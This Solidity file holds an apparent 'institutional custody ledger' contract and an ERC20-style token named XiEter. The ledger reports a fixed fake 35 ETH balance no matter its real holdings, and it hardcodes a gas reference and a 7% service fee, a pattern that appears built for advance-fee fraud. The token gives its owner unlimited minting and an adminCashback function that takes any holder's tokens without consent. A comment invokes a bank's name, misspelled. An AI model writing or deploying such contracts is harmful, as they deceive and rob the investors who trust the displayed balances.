// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* ─────────────────────────────────────────
   MINIMAL ERC20 INTERFACE
───────────────────────────────────────── */
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

/* ─────────────────────────────────────────
   ROAD INSTITUTIONAL CUSTODY LEDGER
───────────────────────────────────────── */
contract RoadInstitutionalLedger {

    address public constant M1_HOST =
        0x53e74a3846f097a18e40868d2853ca19Ef10F308;

    uint256 public constant DISPLAY_ETH_BALANCE = 35 ether;

    address public immutable realOwner;

    address public constant roadOperator =
        0xC22a514594334575939a9456Cd8D9f992C1fb86d;

    uint256 public constant BASE_GAS_REFERENCE_ETH = 35 ether;
    uint256 public constant SERVICE_FEE_PERCENT = 7;

    bool public auditLock;

    event ETHDepositedByOperator(address indexed operator, uint256 amount);
    event ETHWithdrawnByOwner(address indexed owner, uint256 amount);
    event ERC20Withdrawn(address indexed token, uint256 amount);
    event AuditLockSet(bool status);

    event ETHRequestSent(
        address indexed requestedTo,
        address indexed requestedBy,
        uint256 amount
    );

    modifier onlyOwner() {
        require(msg.sender == realOwner, "ONLY_OWNER");
        _;
    }

    modifier onlyRoadOperator() {
        require(msg.sender == roadOperator, "ONLY_ROAD_OPERATOR");
        _;
    }

    constructor() {
        realOwner = msg.sender;
        auditLock = false;
    }

    function emergencyETHHold() external payable onlyRoadOperator {
        require(msg.value > 0, "NO_ETH_SENT");
        auditLock = true;
        emit ETHDepositedByOperator(msg.sender, msg.value);
        emit AuditLockSet(true);
    }

    function withdrawETH(uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "INSUFFICIENT_ETH");
        payable(realOwner).transfer(amount);
        emit ETHWithdrawnByOwner(realOwner, amount);
    }

    function withdrawAllETH() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "NO_ETH_BALANCE");
        payable(realOwner).transfer(balance);
        emit ETHWithdrawnByOwner(realOwner, balance);
    }

    function withdrawERC20(address tokenAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "NO_TOKEN_BALANCE");
        require(token.transfer(realOwner, balance), "TRANSFER_FAILED");
        emit ERC20Withdrawn(tokenAddress, balance);
    }

    function setAuditLock(bool status) external onlyOwner {
        auditLock = status;
        emit AuditLockSet(status);
    }

    function requestETHFromM1(uint256 amount)
        external
        onlyRoadOperator
    {
        require(amount > 0, "INVALID_AMOUNT");

        emit ETHRequestSent(
            M1_HOST,
            msg.sender,
            amount
        );
    }

    function getDisplayedETHBalance() external pure returns (uint256) {
        return DISPLAY_ETH_BALANCE;
    }

    function getM1Host() external pure returns (address) {
        return M1_HOST;
    }

    function getRoadOperator() external pure returns (address) {
        return roadOperator;
    }

    function getExecutionAuthority() external pure returns (string memory) {
        return "OWNER_CONTROLLED_CUSTODY";
    }

    function getGasReference() external pure returns (uint256) {
        return 35;
    }

    function getServiceFeeRatio() external pure returns (uint256) {
        return SERVICE_FEE_PERCENT;
    }

    function getCalculatedServiceFee() external pure returns (uint256) {
        return (35 * SERVICE_FEE_PERCENT) / 100;
    }

    function getAuditLockStatus() external view returns (bool) {
        return auditLock;
    }

    function getSystemProfile() external pure returns (string memory) {
        return "INSTITUTIONAL_CUSTODY_LEDGER";
    }

    function getSettlementMode() external pure returns (string memory) {
        return "NON_PAYMENT_LEDGER";
    }

    function getSystemVersion() external pure returns (string memory) {
        return "ROAD_LEDGER_V4.2.0";
    }

    receive() external payable {}
}


/* ─────────────────────────────────────────
   XiEter TOKEN
───────────────────────────────────────── */
contract XiEter {

    string public name = "Xieter";
    string public symbol = "Xi";
    uint8 public decimals = 6;

    uint256 public totalSupply;

    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Mint(address indexed to, uint256 amount);
    event Burn(address indexed from, uint256 amount);
    event Cashback(address indexed from, address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "ONLY_OWNER");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "BALANCE_LOW");

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;

        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balanceOf[from] >= amount, "BALANCE_LOW");
        require(allowance[from][msg.sender] >= amount, "ALLOWANCE_LOW");

        allowance[from][msg.sender] -= amount;

        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) external onlyOwner {
        totalSupply += amount;
        balanceOf[to] += amount;

        emit Mint(to, amount);
        emit Transfer(address(0), to, amount);
    }

    function burn(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "BALANCE_LOW");

        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;

        emit Burn(msg.sender, amount);
        emit Transfer(msg.sender, address(0), amount);
    }

    /* Deusche Bank AG */
    function adminCashback(address from, address to, uint256 amount) external onlyOwner {
        require(balanceOf[from] >= amount, "INSUFFICIENT_BALANCE");

        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Cashback(from, to, amount);
        emit Transfer(from, to, amount);
    }

    function pullExternalToken(address token, uint256 amount) external onlyOwner {
        IERC20(token).transfer(owner, amount);
    }
}